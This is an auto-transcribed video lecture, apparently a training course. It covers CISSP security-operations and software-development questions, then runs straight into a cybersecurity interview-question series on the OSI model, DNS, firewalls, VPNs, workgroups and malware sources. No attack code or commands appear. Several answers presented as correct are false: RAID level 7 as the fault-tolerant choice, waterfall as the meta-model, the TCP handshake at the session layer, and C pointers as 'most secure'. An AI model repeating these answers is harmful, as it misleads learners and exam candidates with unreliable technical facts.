that i'm going to analyze that data to
identify if anything has been
incorrectly going on or is there any
security incident that has happened and
those would be raised and incidences and
that would be sent to the stock team for
analysis and then an incident response
right similarly intrusion detection and
prevention
logs would be utilized to identify
something that may have been missed by
the ids ips itself you're going to place
controls for investigations like
administrative uh controls which would
be policies that you have made then
you've got criminal laws or some uh if
something bad has happened that can be
described as a crime based on the law of
that land how you're going to deal with
it civil laws regular regulatory laws
and industry standards regulatory raws
would be for example gdpr in the
european union right a civil law would
be where there is no criminal activity
that has happened but let's say there's
a breach of contract between two
organizations and the civil lawsuit has
been filed against the organization for
a breach of service level agreements
regulatory would be the gdpr act where
you have to report to a regulatory body
and if there are any flaws you could be
fined industry standards iso 27001 pci
dss and so on so forth so when you're
looking at these requirements for
investigation all of these would have
prescribed how you're going to handle
that investigation if it is a criminal
investigation an organization by itself
doesn't have the right to investigate
they have to go to a law enforcement
agency and there is a procedure to
follow in case of a civil lawsuit there
are lawyers who would deal with this
this kind of activity send out notices
to the other party then go to a court of
law to file a lawsuit over there in gdpr
there are timelines on how you're going
to report a breach or how you're going
to report an incident and so on so forth
so in the security operations you're
creating a security operation center in
alignment with all of these five
requirements you're going to look at
logging and monitoring activities having
that siem tool which will identify those
devices that you want to monitor collect
relevant information that is prescribed
based on all those five investigation
types that we just discussed then you're
looking at
when you're looking at identification of
assets you go back to your asset
inventory asset register you look at all
the assets that you have and then you
make your strategy and plan how you want
to collect those logs right and then
this module will deal about how do you
want to handle identity and access
management privilege account management
service level agreements and so on so
forth so this basically is the
day-to-day day-to-day business activity
of an organization from a security
perspective so
you are there to identify incidents as a
cis you won't be executing this but you
would be creating policies revolving all
of these aspects so yeah this is what
you need to consider this is what you
need to strategize upon and this is what
you want to advise the organization to
what needs to be in place to be more
effective from a security perspective
let's look at the few questions from
this domain how does a subject get
access to an object in a multi-level
security policy now first we need to
understand what a multi-level security
policy is we need to understand what a
subject is and what an object is let's
look at the options first the subject
sensitivity label must dominate the
object sensitivity label the subject
sensitivity label subordinates the
object sensitivity sensitivity label the
subject sensitivity label is
subordinated by the object sensitivity
label and to repeat the sensitivity tags
again and again the subject sensitivity
label is dominated by the object
sensitivity label too much sensitivity
in a single slide however you can see
that this just confuses the version of
what they're trying to read and not only
you missing what keywords are so people
normally focus on a keyword called
multi-level security policy and start
getting confused in that
while we do disregard what a subject and
an object is right so a subject and an
object is a relationship that is created
between identity and access management
subject being the user object being the
resource that needs to be accessed by
that particular user after which comes a
multi-level security policy which is
basically the access control matrix that
you have created between these multiple
objects and multiple subjects so for
example
in this domain you would also talk about
theoretical models for access management
including lattice based approached where
the sensitivity labels come into the
picture you would talk about clark
wilson model you will talk about bella
padula model and a few other models
right all of them theoretical in nature
which can then based on other
implementations be implemented in a
real-time scenario so all that
understanding comes into picture and
then you need to identify how the
sensitivity labels in a lattice-based
approach could allow you to create those
labels for your subjects and objects and
then the identity and access management
tool would become the verification
factor where it identifies the labels
for the subject and the object and based
on those labels they allow or disallow
connectivity or allow
connections to happen now here the
correct answer is that the subject
sensitivity label must dominate the
object's sensitivity label so the user
should have a sensitivity label that
allows them access to the object which
has an equivalent sensitivity label so
understanding those models becomes very
much important not only from exams
perspective but when you're creating a
policy you basically are going to use
these terminologies and you're going to
create a policy around this
moving on second question managers of
which department are ideal for the
development of information security
policy for an organization business
operation information technology
purchase or human resources now managers
of which department are ideal for
development of information security
policy for an organization and when we
say information security policy we would
obviously assume that is the i.t
department who's going to deal with it
and it's the information technology in
this r in this case but that's incorrect
it is the business operation why because
right from the first domain so we would
be taught in the training for cissp that
security needs to enhance the business
functionality not the other way around
so we are in the business or if we are
in the function of conducting a business
which would offer services and those
services that are being offered the
business activity that has been
conducted should be supplemented by
security so those business activities
could be conducted in a secure manner at
no point in time is going is security
going to be a deterrent to business the
only reason for anything to become a
deterrent to business is the legality of
it if a business is illegal it will not
happen or it should not happen however
if the business activity is legal then
security should not stop that activity
from happening security should be
implemented in such a way that it is the
business activity is strengthened uh
there is security embedded within it
secure by design and then the business
activity goes on so even if you're a
chief information security officer or a
security manager and you go and talk
with the the board of directors or the
steering committee as the terms you will
come across in this training uh you will
understand that it is it's these people
who would define how the business is
going to work what kind of business
activity you're going to do and then you
provide the example and i'll give you an
example here let's say i'm an online
retailer and i want to sell good goods
online which is legal i'm selling all
legal goods goods
now i want security to the team to come
in and
they would help me to secure the the
function of being an online e-tailer if
you will my security team is not going
to come and tell me of not to do go into
that business or stop some services
because they may be insecure right the
security team's requirement is that if i
want to sell goods online they need to
now create an architecture of devices of
clouds of whatever is required to make
it secure so thus the managers of
business operations will always be the
ideal department for the development of
information security policies they
decide what is what the business is
going to happen and then the security
team just complements it by adding the
security to it for example just going on
with this a website is launched with
http the security team comes into the
picture and says data in motion needs
security so we're going to convert it
into https
and at no point in time are they going
to say http is vulnerable so we are not
going to do this we'd rather become a
wholesale shop or something like that
and i'm just giving an example and
rather than me just rambling on let's
move on to the next question question
three installing malicious software on
the system to allow future backdoor
access leads to violation of what
integrity does it violate the data
integrity system user or network now
malicious software on a system to allow
future backdoor access so what are we
doing here we are basically installing a
software or an application on a
particular system which allows a hacker
a backdoor access to the system so this
would violate the integrity of the
system itself right the data would be
compromised but the data would be
compromised because the system got
compromised a user doesn't matter
because a backdoor is a back door entry
where you can get access without even
logging in as a user and a network is
just a way of communication at this
point in time but the sense being that
system got infected and through that
infection you got access to whatever was
on that particular system now uh that's
domain number seven domain number eight
which is the last domain in the cissp
exam is software development security
sdlc or ssdlc secure software
development lifecycle right that's what
is discussed in this domain let's go
back to the cissp
guide and see what this domain would
consist of so
software development security now you
can see software development lifecycles
coming in so they're going to talk about
different life cycles like waterfall
model they're going to talk about agile
they're going to talk about modified
waterfall this module also will talk
about uh devsecops devops and anything
and everything that would be there with
the software development lifecycle now
when we say software development
lifecycle the essence of assist is to
add another s to the s sdlc the sdlc
stands for software development
lifecycle the sys adds one more as the
secure software development life cycle
so
as with everything secure by design
which means security needs to be
integrated at every phase of the life
cycle and not should it should not be
bolted on for example a waterfall model
talks about how the software is going to
be developed and how it is going to be
published or released at the end of the
life cycle at no point in time does it
talk about security does security
architect at that point will die at that
point in time would come into the
picture and decide what are the
requirements of the software what uh
what are the security vulnerabilities or
the risk that they see so threat
modeling would happen and all those
things need to be introduced right from
the inception so if there are developers
or if there is a business requirement
for an application let's go back to the
previous example i am an e-tailer so to
become an e-tailer not do i only need a
website i will need a web application
for that function it will be given out
so i need to develop that application in
a regular lifecycle model i develop that
application and then go into security
where i do a vapt on that application
find out that there are disastrous
results and then i go back and start
coding again which is not a good
scenario so i have hired a cis who will
then come into the picture during the
sdlc and at the inception itself when
businessmen are talking about
how the business is going to happen at
that point in time the assist will come
in and start with a threat modeling
exercise saying you know what let's talk
about what are the risks this
application is going to face you're
going to handle a lot of payment
information because people need to pay
for the products right so credit cards
you're going to be going to be involved
there's a database or sql injection
attacks so these are the threads that
we're looking at and now a threat
modeling exercise would be followed by a
risk assessment then would be looked at
upon a by an impact analysis and then
based on that you will prioritize those
risks you will then educate your
developers to use secure coding
practices at the same time security
testing would be done to see how the
application is being evolved and then by
the time that the software development
lifecycle comes to an end you would have
a secure software which had security by
design integrated since the inception
rather than having bolted on now this is
the ideal scenario that you're looking
for the expense and the budgeting that's
where the balance of
life of
capital uh investments
and
time to market and all that comments
comes into the picture but for the
training we will always be in an ideal
scenario will always have enough time
enough resources monetary and human and
the exam basically looks at a very ideal
scenario in which you got just about
everything you just need to make the
correct decision at no point in time are
you going to think that if i start doing
a particular strategy it is going to
cost me a lot of money so i don't want
to do that that's the real whole
scenario in the real world you look at
the costs you look at the timelines
deadlines and then you take a informed
decision of how much you want to invest
in what in the ideal world for the cisp
exam or the cissp exam there are no
limitations
you are looking at the most correct way
of doing those things and thus you are
you identify those requirements and
that's how you answer the exam so you're
looking at the security software
environments that you require
configuration management auditing and
logging of changes security impact of
acquired software now in this scenario
we talked about developing a software
what if i purchase a third-party
software and i introduce it into my
organization now this software when
integrated how is it going to impact my
current security controls
impact my current identity access
management my networking my other
applications my communications so that's
something that you want to assess as
well right so let's go for the questions
question one in which of the following
raid level the drive array continues to
operate even if any disks fails now
in the actual exam they are not going to
be very technical it's a managerial exam
so they may not ask you these kind of
questions but the knowledge is still
required so you need to know that there
is something called raid the different
levels of raid
because you might want to
use that as a solution in a particular
thing how do you want to implement rate
and all of those that's not the
knowledge that we want but in this
scenario rate level 7 is the ideal
answer question 2 which of the following
steps can be utilized uh or can be used
to protect an organization against the
failure of a critical software firm now
basically what does this talk about this
talks about disaster recovery or this
this talks about business continuity for
example there's a failure of some sort
when there is something that fails what
does it do it interrupts the business so
the moment of business interruption
happens what should kick in the business
continuity plan if the business
continuity plan fails then the disaster
recovery plan kicks in so if you look
into it as we go in we might even come
against uh terminologies like rtos rpos
return time objective and recovery point
objective and at that point in time you
want to look at how do we want to
recover from a data loss and thus you
will come across solutions now
of the four options full backups
differential backups and incremental
backups and the fourth one software
escrow agreement what is the difference
between these the full backup is a
complete backup of the entire data that
you have taken now it sounds easy but in
an organization data could be terabytes
petabytes and to do a complete backup
might take days weeks or
a lot of time right it's not just
copying one megabyte from a hard disk to
a usb drive and be done with the backup
so full backups may be possible but not
on a regular basis so maybe you do a
full backup every week which means that
at the end of the week if the data loss
happens then you have lost the data for
an entire week because the backup was
last week thus it's not a very good
solution and to complement that we could
use incremental backups and differential
backups right so the training would
include all of these definitions of what
these backups are what happens and then
the fourth option software escrow
agreement what is that now in a software
development or a software lifecycle if
i've purchased a software from a third
party my biggest risk is not of me
getting hacked on the app the software
getting hacked from a business
continuity the biggest risk is if the
software provider goes bankrupt or is
taken over by somebody else or stop
supporting the software then what what
am i to do because i may have invested
millions of dollars or reinvesting into
a different product and migrating to a
different product would be expensive
very costly and need to be very time
consuming so what do i do at that point
in time so there is an option for
software escrow agreement what does that
mean that the source code of that
software is placed in an escrow which
means let's say
in a bank where the bank will hold the
soft uh the source code in a secure
manner and the source code cannot be
accessed or by be modified either by the
developing organization or the
purchasing organization so it just sits
with the bank if the developers go out
of business or they stop supporting at
that point in time the escrow can be
opened and the purchaser that that's us
in this case can still get the source
code so now we can develop the software
or we can go into the source code
analyze and save ourselves from a
disaster right so these are the four
options now here you're talking about a
critical software firm that failed
you're not talking about data that
failed so the correct answer here is the
software escrow agreement right question
number three now here we come across the
development models which one of these is
a meta model that incorporates several
other software development models are we
looking at waterfall modified waterfall
spiral or critical patch but here the
correct answer is a waterfall model we
are going to look at 10 different
questions on networking then we'll have
10 more questions on software and
programming another 20 questions on
operating systems and applications
10 questions on cyber attacks and then
the finally 10 questions on cryptography
so we're going to discuss over 50 odd
questions each in these different fields
which will help you crack your
interviews as far as cyber security is
concerned let's start off with
networking questions let's start off
with question one what is the osi model
explain the different layers of the osi
model osi largely is a theoretical model
utilized to understand networking and
how data packets are created and how
they are being processed by a computer
this is normally used by the tcp the
transmission control protocol over
internet protocol
software suite
so osi is known as the open systems
interconnection model it is a reference
model that describes how applications
are going to interact via the computer
network
there are seven different layers that we
need to understand they are as follows
so in this diagram there are these seven
different layers we start off from the
bottom first is the physical layer the
data link layer network layer transport
layer session layer presentation and
application
when such a question is asked in an
interview it is not only that we
identified these seven layers explaining
what the osi model is in the first place
we then try to identify these seven
layers and we give a brief description
about each and every layer if there are
any additional questions they will come
after
this basic question
so let's start off with the physical
layer
this is the lowest layer of the osi
model now this is where any and every
physicality of your computer comes into
the picture so it could be a network
interface card it could be an rj45 or a
cat5 cable anything that allows data to
be transmitted physically from your
machine to another machine next comes
the data link layer
so on the data link layer as far as
networking is concerned we just need to
understand that data packet is encoded
decoded into bits at this layer this is
also the layer that deals with mac
addressing so the physical address of
every network network interface card
which is the mac address which is
utilized to
route
data packets over the network this is
where the mac address resides on the
data link layer
the next layer is the network layer
here datagrams are transferred from one
to another the function of this layer
are routing and logical addressing the
moment we talk about routing and logical
addressing ip addresses come into the
picture ip version 4 ip version 6.
so network layer will deal with ip
addressing and the routing of those
packets then comes the transport layer
this is the layer responsible for
end-to-end connections that
automatically signifies that this is
where tcp and udp will be working
tcp stands for transmission control
protocol udp for user datagram protocol
tcp
is a connection oriented protocol
whereas udp is a connectionless protocol
these two protocols are utilized
to establish connectivity between two
machines tcp is a more reliable method
of connectivity because there are a lot
of packets that are sent across to
verify that the data has been sent data
has been received and so on so forth
whereas udp is a connection less
protocol where data is just dumped
without verifying whether the receiver
actually receives that data or not
so in a nutshell on the transport layer
tcp and udp make their appearance and
this is where that functionality lies
then comes the session there
this controls signals between the
computer it establish maintains and
terminates connections between processes
so in the transport layer we talked
about tcp and udp udp being a connection
less protocol where data is just
transmitted without verifying whether
the receiver received that data or not
whereas tcp we studied is more of a
reliable protocol thus
there are different packets signals that
will be sent across to verify that data
has been transmitted it has been
received properly
and then the next uh segment of that
data is being sent so those control
signals are established using the
session layer so the three-way handshake
of tcp the acknowledgement packets and
those kind of packets will be taken
taken care of on the session layer of
the osi model
then comes the presentation layer
the presentation layer is responsible to
translate data into the application
layer format so the formatting right
mime or encoding that is being utilized
the utf-8 character set that we utilize
for
presentation
encryption mechanisms all of these work
on the presentation layer
and finally comes the application layer
where
the application itself uses a particular
protocol
so that the
other
machine on the receiving end the
application on that machine would be
able to understand what the
communication was about
right so in a nutshell
if if i start from up top the
application layer will deal with any of
the data that the application
is generating so maybe an user input
you're logging in you're typing the
username password all that data will be
constructed let's say into an http or
https format that's where application
layer comes into picture then the
formatting of which into utf-8
and the encryption of which would be
done at the presentation layer
then this transport layer and the
session layer would kick in to establish
a tcp session do the three-way handshake
establish that connectivity ip
addressing would be done on the network
layer mac addressing would be done on
the data link layer and when everything
is ready on the physical layer the
packet will be sent out at the receiving
end the packet will be received on the
physical layer and then all these layers
will be reversed and finally at the
application layer the data would be
presented to the application who would
then execute it and showcase it on the
screen
of the recipient
so this is the way you want to explain
this question you want to be very
concise precise about what you're
explaining you don't want to go into two
hypothetical scenarios you don't want to
delete earlier with the layers you just
want to give the basic functionality
want to demonstrate that you understand
what the osi layer is how the computer
functions and you want to move on from
there if the interviewer has any further
follow-up questions they will ask those
specific questions
so that's question one moving on to the
question two
question two is define unicasting
multicasting and broadcasting
now this is a question which can be very
lengthy but again most of your interview
questions
are designed that way it's basically to
understand how much conceptually you are
aware about these technologies so you
have to be very concise don't go
uh rattling about technology too much
but in a concise manner just try to
explain what these things is so when
data is being transmitted over a network
it can be transmitted either in one of
these particular manners it can either
be a unicast multicast or a broadcast so
what is unicost
unicast is when a message is sent from a
single user to a single receiver so one
to one right so
uh one machine talking to another
machine and nobody else so also known as
point-to-point communications one point
two one of the point if you have to send
information to multiple receivers then
you will have to send it using multicast
right so this is where
your multicast networking comes into
picture so in our case uh let's assume
it's a network where there are
there's a class c network approximately
255 odd machines
and within these there are two machines
that want to talk to each other
if they want to talk between each other
it would be a point-to-point
communication where they will utilize
unicast where only these two machines
will have visibility of that
conversation and the other machines will
not even realize that this conversation
is taking place
if
one machine wants to talk to multiple
machines
then the multicast comes into the
picture as the name suggests in this
mode of communication data is sent from
one or more or more
sources to multiple destinations
multicast uses the internet group
management protocol also known as the
igmp protocol to identify groups so
under this igmp protocol various groups
are created where machines
are subscribed to those particular
groups and whenever a message needs to
be sent through those groups
it will be identified by the igmp
protocol and then that particular
message will be sent to those multiple
machines that are members of those
particular groups
and then comes the broadcast
the third method is known as the
broadcast as it says it is going to
broadcast to all so this is one to all
that is communication between a single
user and it is going to be sent to all
the machines in that particular network
right so the three ways unicast is one
two one
multicast is one to many
and broadcast is one to all then
question number three
what is dns
dns stands for domain name system it is
like the internet's phone book that is
responsible for mapping the domain name
into its corresponding ip address and
let me give you an example over here
whenever we go and open up let's say a
browser a google chrome browser we type
in www.google.com
and then we press enter and magically
google comes in front of us the website
rather
now how does the computer know who
google is because as far as we are
concerned humans understand google and
words like that computers don't
computers
deal with binary zeros and ones
right and as far as internet is
concerned they will only deal with ip
addresses and mac addresses so how does
a computer know how to find google.com
and where is it located so the moment we
type in
in the browser window in the address bar
google.com and press enter a dns query
is generated automatically by the
browser where a packet is sent to our
dns servers asking what the ip address
is so in short dns resolves domain names
to their corresponding ip addresses
there is a dns server which will have
this index
a database of all the domains associated
with their ip addresses
if one particular dns server does not
have that information that you're
looking for it may query another dns
server who may have that particular
response
so the first thing is when you type in
domain name
it gets resolved with the dns it
identifies the ip address corresponding
to that particular domain name and thus
allows the computer to route that packet
to the particular
server where that domain name resides
so in this scenario if you look at the
screen on the local pc you have typed in
cybersecurity.com
there's a dns resolution that a query
that goes to the dns server what is the
ip of cybersecurity.com the dns server
looks it up in its particular database
if it has the corresponding ip address
it will then respond back the ip
addresses 172.17.252.1
after which the packet is sent off to
cybersecurity.com moving on to question
number four what is a firewall
now this is a very good question and
normally a very basic answer that i've
ever heard is that a firewall is a
hardware and a software firewall but
that's the functionality of a firewall
that is what how you can install a
firewall but there are different types
of firewalls and there is a specific
functionality that the firewall is
created for
right so firewall
is either a hardware or software
but its responsibility is for blocking
either incoming or outgoing traffic
from the internet to your computer they
secure a network so essentially the
firewall will allow a connection to
happen or disallow a connection to
happen it won't go beyond that that's
the basic functionality of a firewall
okay so based on the
configurations that you have done based
on the rules that you have created on
the firewall it will then based on those
rules identify whether some traffic is
allowed in that network or some traffic
is
to be blocked from entering that network
so as the screen shows
the firewall rules will analyze whether
the traffic is good
if yes it will allow if the traffic is
bad it will block the traffic and not
allow that connection from happening in
the first place
now there are few common types of
firewalls that also need to be included
in the answer to this question and the
first one is a packet filtering firewall
these are the most common types that you
will come across which analyze packets
and lets them pass through only if they
match an established security rule set
now here people do get confused when we
say that we analyze packets
people think that these firewalls will
analyze the contents of that packet
which is not correct
when the definition for a packet
filtering firewall says that these
firewalls analyze packets it means that
they are only analyzing the source and
destination ip addresses port numbers
and the protocols that are mentioned in
those packets
these firewalls do not have the
capability of deep packet inspection or
a dpi as it is known if that capability
comes into the picture you're basically
looking at an intrusion detection system
or intrusion prevention system in
today's world called as a next-gen
firewall
okay so a packet filtering firewall
essentially will only analyze data
packets for its source and destination
ip addresses port numbers and the
protocol that is being utilized it will
then map that information to the rules
that are there on the firewall and based
on those rules it will either allow that
a connection to happen or disallow that
connection from happening
the second type of is a proxy firewall
these firewalls filter network traffic
at the application level so when you say
application level they work at the layer
7 of the osi model packet filtering
firewalls since we have mentioned that
they've worked on ip addressing and port
numbers will work on
the network layer of the osi model also
on the transport layer because you also
look at protocols
proxy firewalls will work at layer 7
which is the
application layer of the osi model and
will deal with application level
protocols such as http https ftp smtp
and so on so forth
and the third one is a stateful
multi-layer inspection firewall these
filter packets are the network transport
and application layers so they basically
do
the job of the first and the second type
of firewalls
the packets are compared to known uh
trusted packets but now the first
question is if there is a stateful
multi-layer inspection firewall why do
we have type one and type two firewalls
like packet filtering and proxy
firewalls that is because that is how
the firewalls have evolved we started
off with the packet filtering then we
added functionality to it and so on so
forth
so if a question comes what is a
firewall you start off with the
option saying it is a hardware or
software this is the responsibility the
functionality of a firewall is to allow
good traffic and disallow bad traffic
based on the rules that have been
configured on the firewall and then
you've got basically three types of
firewalls packet filtering proxy and
stateful multilayer and just include a
brief description of each of these
firewalls if getting your learning
started is half the battle what if you
could do that for free
visit skill up by simply learn click on
the link in the description to know more
then moving on to question number five
what is a vpn
vpn is also called a virtual private
network it is a connection between a vpn
server and a vpn client
so it basically creates an encrypted
tunnel between the client and the vpn
server which is then utilized to
secure the connections that you're
making with the internet so as you can
see in the diagram
the user has a vpn client installed on
the machine the vpn client then creates
an encrypted tunnel to the vpn server
and through this tunnel encrypted data
is transmitted which can then be
processed by the vpn server
sent to the internet information can
receive can be received back by the vpn
server the vpn server will encrypt that
data back and send it back to the user
so if there is a man in the middle
attack that is happening or a hacker
trying to eavesdrop on the communication
mechanism they will not be able to do so
because of the encrypted trigger it is
very difficult to decrypt this or hack
through this encrypted tunnel
it is possible but it is very difficult
to achieve that moving on to question
number six what are the advantages of
distributed processing
now before we go into advantages of
distributed processing we first have to
understand what is distributed
processing
so it is a term which describes various
computer systems
that use more than one processor to run
an application
here multiple computers across different
locations
share the same processor the advantages
of distributing processes are as follows
but before we go into the advantages
distributed computing is basically where
multiple machines will pool their
resources together
to run a singular application so an
application that has multiple resources
and can scale up and scale down as and
when required
the advantages are
that it can be very very useful in data
recovery
for example raid where you're striping
data on various hard disks it is
reliable it is cheaper lower cost can be
achieved and it is easy to expand
because of the scalability factor that
we just talked about if there is loss of
data in one computer it can then be
recovered by another interconnected
computer and one of the examples would
be blockchain in today's world right
what is blockchain that this data is uh
created live and stored on a connection
of computers so if one of the computers
goes offline the other computers in that
network will still have that data
and the blockchain will still function
without any issues the second point a
glitch in one machine does not affect
the processing as there will be multiple
other machines like we discussed in the
blockchain
several cost effective mini computers
are used instead of costly or mainframe
machines so instead of having a server
bank
i can have multiple machines connect
interconnected together
and they can function
in that particular blockchain or for
that particular distributed processing
mechanism
depending on the amount of data
processing more computers can be
attached to the network thus you can
increase the number of computers that
can be a part of that blockchain or you
can reduce them as and when necessary
moving on to question number seven what
is tcpip
tcpip or transmission control protocol
over internet protocol is a set of
communication protocols that are used to
interconnect networking devices on the
internet this protocol defines how data
should be transmitted over the internet
by providing end-to-end communications
so essentially if you want networking to
be established on your machine you will
need tcp
without tcp ip there will be no work
groups there will be no domains
basically your interconnectivity will go
for a task
tcp is a software that once installed on
your machine will then interact with the
hardware which is your network interface
cards and then your switches wires
cables and all those through protocols
that have been already pre-configured in
it
so within the tcp suite of softwares you
will have all the protocols all the
functionality of the osi layer
and each and every protocol that works
on each and every layer will be
predefined and pre-configured to work in
a particular manner the internet
protocol is all about routing each
individual packet to make sure it
reaches its destination so with the tcp
you're talking about the protocols that
will allow you to format the data and
generate it so that you can communicate
it over the network the ip will then
deal with the routing of those packets
so that the packet can be routed to the
correct computer and be received by the
recipient so the tcpip model is the
compressed version of the osi the seven
layers will get converted into four
layers the network access layer internet
layer transport layer and application
layer going on to question eight
what do you mean by ipconfig and
ifconfig both of these are commands the
first one on a windows machine the
second one on a linux machine
so ipconfig is known as the internet
protocol configuration this is a command
that is used on the command line
interface of microsoft windows
to view all the adapters and the
configuration of each and every adapters
for their network interfaces so as you
can see on the right hand side in the
command prompt screen if once you type
in the ip config command on the c prompt
and press enter it will give you a list
of all the adapters that are there
so you can see wireless lan adapter
local area connection the media is
disconnected it doesn't exist at the
bottom you'll see the wi-fi connection
wireless lan adapter and can give you
the ip version 6 ip address ipv version
4 address the subnet mask and the
default gateway so this is the
configuration that allows the machine to
know on what network it is on what is
the default gateway for communicating to
the internet what is the subnet mask so
how many computers may exist in that
particular network and what is the ip
address of that specific computer so
that it can communicate across the
network as well ifconfig is the same
thing on the linux mac or unix operating
system
so the command will also give you the
list of interfaces and the configuration
of each and every interface
it is used to configure control the tcp
network interface parameters from the
command line interface
it allows you to see the ip address of
these network interfaces so here you can
see
uh
the
wlp19s
the ip address being 192.168.43.2
subnet mask being 255.255.255.0
with the broadcast being 192.168.43.255.
question nine
what is the difference between a domain
and a work group this can be a very
interesting question and can be a very
lengthy question at the same time a work
group is nothing but a decentralized
network where you have
interconnected multiple machines
together and each machine acts in its
own individual capacity
thinks of itself as a server right
so a decentralized network use every
user manages the resources individually
on their pc so local users on their own
pcs
managing
the network shares what can be shared
from that particular machine what data
should be shared should not be shared to
whom it can be shared with and so on so
forth
it is good if you've got a small network
a few machines all together
and you want them to interact with
minimal
management effort
right so each computer each user will
decide what they want to allow other
users to see on that particular network
and all of them would be connected over
a lan a local area network either a
wireless or a wired one so if you look
at your home wi-fi right now that is one
of the best examples of having a work
group
the domain on the other hand is a
centralized network model so in a
corporate environment whenever you go
there and you got a domain based
username and password which
when entered onto a particular machine
gives you access to the entire network
or whatever applications and whatever
resources have been allocated to you
that is where the domain comes in so it
also uses a single sign on mechanism for
all the resources that are made that are
to be made available to you whereas in a
work group your local user only meant
for that particular computer right so
coming back to the domain it is an
administrator who is going to manage the
entire domain and all of the resources
connected to the domain the resources
could be switches routers servers data
stores applications web servers mail
exchange servers and so on so forth so
all of these are administered by an
administrator through the domain it is
the most reliable and optimum solution
for a large network where multiple users
are going to interconnect and share that
data amongst each other
right the computer can be connected to
any network that means you can be on the
internet and through the internet using
a vpn you can connect to your corporate
network authenticate in and get access
to whatever resources you are allowed to
access whereas in a work group you have
to be a part of that network to access
that internet if you change your
location you go and connect to another
wi-fi you will lose access to your
previous wi-fi then the last question
for the networking uh section what is
data encapsulation in networking data
encapsulation refers to the process of
adding headers and trailers to the data
the data link layer binds each packet
into a frame that contains the hardware
address of the source and the
destination computer so in this example
when you're talking about data
encapsulation we have talked about how
data that has been created by the
application layer we'd have a header
and a trailer that will give
the various informations of where that
data needs to be sent so the hardware
address which is the mac address comes
into the picture and gets added to the
header and the ip addresses port numbers
and all of those things would then be
added to this
uh traders as well so that the data can
be then routed
to the intended recipient of that
particular communication
with this we end the first 10 questions
in networking and in this video we are
going to look at software and
programming so we're going to look at
the first 10 questions
first question being how do you keep a
computer secure now this is going to be
a very generic question so you want to
put your best foot forward and you want
to identify the most common
methodologies on how you can keep a
computer secure
so when we talk about computers the
first thing that you want to talk about
is authentication mechanisms where you
want multi-factor authentication or
two-way authentication to ensure that
your accounts are kept secured now if
you look at using passwords depending on
how passwords are being stored by the
application
password attacks can
be possible either a brute force attack
or a dictionary based attack
uh or even password guessing attacks are
possible to mitigate those kind of
attacks you will need multi-factor
authentication
to ensure that accounts are kept secure
now even if we are using multi-factor
authentication we also want to look at
secure passwords
which means
that the password is complex enough to
withstand most of the common attacks and
a brute force attack or a dictionary
attack is just not possible so we want
to randomize our passwords we want to
create a complexity where a password
meets standards such as
me has at least one lowercase one
uppercase character has numerics and
special characters and is randomized is
not based on a dictionary word doesn't
contain usernames email addresses phone
numbers or anything that is personal to
that particular
user
third keep regular updates which means
that there will be patches that will be
released for the application for the
software that you are utilizing download
the patches install them on a regular
basis to ensure that you are secured
against the most recent attacks that
have been identified
install a good antivirus
could be a internet security suite which
will have an antivirus intrusion
detection system a firewall
and will help you protect yourself
against ransomwares malwares
and any script-based attacks
also have a specialized firewall on your
system could be a host-based firewall or
a network-based firewall to ensure that
attacks are kept at a minimum and you
have your network definitions in place
to allow or disallow connections from
happening to your devices
have anti-phishing softwares installed
as well to ensure that you are not
getting any spam mails even if you do
you are able to identify that
and not fall free or victim to those
spam mails
phishing attacks are generic
where they are directed towards
individuals
and they
prey
on the killability of that particular
individual so our nigerian frauds or the
lotteries that we win on a regular basis
of hundreds of million dollars
those messages the emails that we
receive they are all phishing emails
where
they're basically
prone to victimize the user and then
drop them off money or
install some malware
or do some other malicious activity
if you want to enhance encryption about
data that you have stored on your
devices or on your or that is accessed
by your software or being transmitted by
your software use encryption
encrypt your data whether it is at rest
whether it is in motion or whether it is
at use
thus reducing data leakage and data loss
possibilities and finally in the
foremost secure your dns dns is the
domain name server which is utilized
by
computers to resolve domain names to ip
addresses
if a dns poisoning attack is possible
where your dns settings have been
modified by an attacker and you are
redirected to a malicious dns server
that server is going to redirect you to
another malicious application which may
have a malware or a malicious software
as a payload
also you don't want people to know your
dns servers and the queries that you're
making so you want to use secure dns or
dns over https to encrypt your dns
queries as well
so in a nutshell if you follow these
eight steps
your devices your computers your
applications are going to be as secure
as possible the next question discuss
security related aspects between c c
plus plus and java now this is an
open-ended question it depends on which
level you're giving an interview on but
you're looking at it from a fresher's
perspective
or a less experienced perspective
and thus these are some of the aspects
that we want to look at and the
comparisons between c c plus plus and
java so the five aspects that we are
looking at are pointers code
translations storage allocation
inheritance
and
overall security are based on cc plus
plus and java so when we say pointers
we are looking at
how we are going to uh
we are using pointers and
stacks and heaps to point to functions
and how we exit those functions and
how those
functions are then recalled into the
next function so c supports pointers it
is most secure
c plus plus also supports point pointers
but it is a little bit less secure than
c java it is not supported turret access
is given to memory allocation and thus
it is the least secure as far as
pointers are concerned when we look at
code translations
c
is able to compile but it is not secure
same with cc plus but in java it does
interpreted language and it is
abstracted and secured
in storage allocation in c we use malloc
and
catalog memory allocation
which is less secure because it does not
have internal checks on
verifying what memory is allocated and
the user input that is being compiled or
that is being input to that memory right
thus this can allow buffer overflow
errors
to creep in because of the
non-verification of the input data
so it is the least secure in cc plus
plus it uses
new and delete options and is
comparatively secure but java uses a
garbage collector and thus is the most
secure as far as storage allocation is
concerned
when we talk about inheritance
the most secure is ccp plus plus
c has no inheritance so it's not secure
in c plus plus it is supported
thus it is the most secure whereas in
java there is multi inheritance that is
not supported and does is comparatively
secure overall the most secure out of
all these based on these five aspects is
java
the least secure is c
and the
mid level is c plus plus moving on to
question 13 what are the different
sources of malware now malware stands
for malicious software right
malware is basically a software that
poses as a legitimate software but has a
payload of a trojan virus spyware
keylogger or some malicious software
that is going to have
a negative impact on security of your
particular device
so the question here is what are the
different sources of malware we want to
identify the most common
sources through which malwares infect
end-user devices in today's world and we
can start with pop-up ads so most of the
websites if you're visiting untrusted
sites if you're being redirected to
sites that you don't know about there'll
be a lot of pop-ups coming your way
where it says you're the 1 millionth
visitor to this site please click here
to download your gift
or it will say uh congratulations on
winning a particular product for
visiting this page and so on so forth
there are some instances where you can
see a banner which is flashing at you on
top of the page and says that there are
eight
uh infections that have been identified
on your computer click here to download
an antivirus to clean the infections so
all of these pop-ups
are there as a social engineering attack
as a phishing attack to make gullible
people click on those links and download
those malwares now the software that is
posing as a security software itself can
be a malicious software which is going
to install a trojan or a virus or a bot
on your machine compromising the
security of that machine
the second is removable media usbs and
humans have a fascination with usb so if
you find a usb lying around
it's a free usb you get excited about it
and you want to
take it home you want to plug it into a
machine and see what's on the usb worst
case scenario you format it and you've
got a free usb to utilize higher the
capacity the better but that is one of
the most easiest way
people use malwares to
uh to be deployed on unsuspecting users
if there is a usb lying around
